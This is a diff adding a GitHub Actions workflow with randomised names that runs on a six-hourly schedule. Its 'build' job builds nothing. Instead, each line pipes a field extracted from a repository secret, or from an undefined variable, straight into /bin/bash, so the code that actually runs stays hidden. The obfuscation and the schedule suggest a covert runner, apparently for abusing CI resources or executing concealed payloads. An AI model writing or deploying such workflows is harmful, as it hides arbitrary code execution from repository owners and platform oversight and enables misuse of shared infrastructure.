@@ -1,0 +1,22 @@
+name: ghyiuhru
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ghyiuhru
+        env:
+          a71721: ${{ secrets.a71721 }}
+        run: |
+          echo $a71721 | jq -r .be92488 | /bin/bash
+          echo $x31 | jq -r .zhyv15 | /bin/bash
+          echo $d06 | jq -r .l995 | /bin/bash
+          echo $jd765 | jq -r .ecbk4566 | /bin/bash
+          echo $lnpck4441 | jq -r .fhg8839 | /bin/bash
+          echo $sspl43541 | jq -r .yfqx46 | /bin/bash
+          echo $egw4575 | jq -r .usp97 | /bin/bash
+
